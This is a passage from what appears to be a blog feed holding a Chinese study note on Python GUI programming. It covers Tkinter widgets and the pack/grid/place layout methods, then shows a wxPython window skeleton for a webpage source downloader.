punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"RUNOOB"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar1<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"GOOGLE"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar2<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>C2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-标签控件（Label）及消息控件（Message）"><a href="#Python-Tkinter-标签控件（Label）及消息控件（Message）" class="headerlink" title="Python Tkinter 标签控件（Label）及消息控件（Message）"></a>Python Tkinter 标签控件（Label）及消息控件（Message）</h4><p>Python Tkinter 标签控件（Label）指定的窗口中显示的文本和图像。如果需要使用一行或多行且不应该被用户更改的标签控件需要用label控件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Label <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># option 可选项内容与Button的可选项内容相近，但也有wraplength（标签文本显示行数）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#一个简单样例：</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tkroot <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>w <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello RUNOOB!"</span><span class="token punctuation">)</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>标签（Label）</strong>和 <strong>消息（Message）</strong>：除了单行与多行的不同外，属性和用法基本一致，用于呈现文本信息。</p><p>值得注意的是：属性text通常用于实例在第一次呈现时的固定文本，而如果需要在程序执行后发生变化，则可以使用下列方法之一实现：</p><p>1、用控件实例的configure()方法来改变属性text的值，可使显示的文本发生变化；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      timestr <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前的时间并转化为字符串</span>      lb<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>text<span class="token operator">=</span>timestr<span class="token punctuation">)</span>   <span class="token comment"># 重新设置标签文本</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span> <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、先定义一个tkinter的内部类型变量var=StringVar() 的值也可以使显示文本发生变化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      var<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取当前时间</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>   <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>var<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>textvariable<span class="token operator">=</span>var<span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-文本组件-Text"><a href="#Python-Tkinter-文本组件-Text" class="headerlink" title="Python Tkinter 文本组件 (Text)"></a>Python Tkinter 文本组件 (Text)</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657025434153.png"  /><p> 上表位置的取值可为整数，浮点数或END（末尾），例如0.0表示第0列第0行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       s<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>       txt<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>s<span class="token punctuation">)</span>       root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>  <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>txt<span class="token operator">=</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>txt<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>输入框（Entry）</strong>：通常作为功能比较单一的接收单行文本输入的控件，虽然也有许多对其中文本进行操作的方法，但通常用的只有取值方法get()和用于删除文本的delete(起始位置，终止位置)，例如：清空输入框为delete(0，END)。</li></ul><h3 id="GUI应用程序类的通常写法"><a href="#GUI应用程序类的通常写法" class="headerlink" title="GUI应用程序类的通常写法"></a>GUI应用程序类的通常写法</h3><p>通过类application组织整个GUI程序，类application及继承了frame，及通过继承拥有了父类的特性。通过构造函数<code>_init_</code>()初始化窗口中的对象，通过createwidgets()方法创建窗口中的对象。</p><p>Frama框架是一个tkinter组件，表示一个矩形的区域。frame一般作为容器使用，可以放置其他组件，从而实现复杂的布局。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> master<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>master <span class="token operator">=</span> master        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_widgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">create_widgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>hi_there <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello World\n(click me)"</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>say_hi        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"top"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"QUIT"</span><span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">,</span>                              command<span class="token operator">=</span>self<span class="token punctuation">.</span>master<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"bottom"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">say_hi</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hi there, everyone!"</span><span class="token punctuation">)</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="几何管理（控件布局）"><a href="#几何管理（控件布局）" class="headerlink" title="几何管理（控件布局）"></a>几何管理（控件布局）</h3><p>Tkinter控件有特定的几何状态管理方法，管理整个控件区域组织，以下是Tkinter公开的几何管理类：包、网格、位置</p><table><thead><tr><th>几何方法</th><th>描述</th></tr></thead><tbody><tr><td>pack()</td><td>包装；</td></tr><tr><td>grid()</td><td>网格；</td></tr><tr><td>place()</td><td>位置；</td></tr></tbody></table><h4 id="Pack-布局方式："><a href="#Pack-布局方式：" class="headerlink" title="Pack()布局方式："></a>Pack()布局方式：</h4><p>Pack()方法： 是一种简单的布局方法，如果不加参数的默认方式，将按布局语句的先后，以最小占用空间的方式自上而下地排列控件实例，并且保持控件本身的最小尺寸。</p><p>使用pack()方法可设置 fill、side 等属性参数。</p><table><thead><tr><th>pack()函数的属性</th><th>取值的对应意义</th></tr></thead><tbody><tr><td>fill=X/y/BOTH</td><td>允许控件向水平方向、垂直方向或二维伸展填充未被占用控件</td></tr><tr><td>side=left/right/bottom</td><td>表示本控件实例的布局相对于下一个控件实例的方位</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span>  <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>lbred <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbred<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>lbgreen <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"绿色"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbgreen<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>lbblue <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"蓝"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"blue"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbblue<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>X<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="grid-布局方式："><a href="#grid-布局方式：" class="headerlink" title="grid()布局方式："></a>grid()布局方式：</h4><p><strong>grid()方法</strong>：是基于网格的布局。先虚拟一个二维表格，再在该表格中布局控件实例。由于在虚拟表格的单元中所布局的控件实例大小不一，单元格也没有固定或均一的大小，因此其仅用于布局的定位。pack()方法与grid()方法不能混合使用。<br> <strong>grid()方法常用布局参数如下：</strong></p><ul><li> <strong>column:</strong> 控件实例的起始列，最左边为第0列。</li><li> <strong>columnspan:</strong> 控件实例所跨越的列数，默认为1列。</li><li> <strong>ipadx,ipady:</strong> 控件实例所呈现区域内部的像素数，用来设置控件实例的大小。</li><li> <strong>padx,pady:</strong> 控件实例所占据空间像素数，用来设置实例所在单元格的大小。</li><li> <strong>row:</strong> 控件实例的起始行，最上面为第0行。</li><li> <strong>rowspan:</strong> 控件实例的起始行数，默认为1行。</li></ul><h4 id="place-布局方法："><a href="#place-布局方法：" class="headerlink" title="place()布局方法："></a>place()布局方法：</h4><p><strong>place()方法</strong>：根据控件实例在父容器中的绝对或相对位置参数进行布局。其常用布局参数如下：</p><ul><li><strong>x,y：</strong>控件实例在根窗体中水平和垂直方向上的其实位置（单位为像素）。注意，根窗体左上角为0,0,水平向右，垂直向下为正方向。</li><li><strong>relx,rely：</strong>控件实例在根窗体中水平和垂直方向上起始布局的相对位置。即相对于根窗体宽和高的比例位置，取值在<code>0.0~1.0</code>之间。</li><li><strong>height,width：</strong>控件实例本身的高度和宽度（单位为像素）。</li><li><strong>relheight,relwidth：</strong>控件实例相对于根窗体的高度和宽度比例，取值在<code>0.0~1.0</code>之间。</li><li>利用place()方法配合relx,rely和relheight,relwidth参数所得的到的界面可自适应根窗体尺寸的大小。place()方法与grid()方法可以混合使用。如下例子：利用place()方法排列消息（多行标签）。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#参考样例：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> Message<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token triple-quoted-string string">'''我的水平起始位置相对窗体 0.2，垂直起始位置为绝对位置 80 像素，我的高度是窗体高度的0.4，宽度是200像素'''</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>msg1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>relx<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>relheight<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Wxpython"><a href="#Wxpython" class="headerlink" title="Wxpython"></a>Wxpython</h2><blockquote><p>Wxpython这个是我最后采用的gui库，倒不是因为有多大去别，主要是我找到了一个自动生成Wxpython的代码段的小程序，我最后选择了wxpython。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'网站源代码下载器'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">365</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入需要下载的链接'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#print('an1,按钮被单击')</span>        <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span>  <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文-源代码下载器的设计实现</title>
      <link href="/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
      
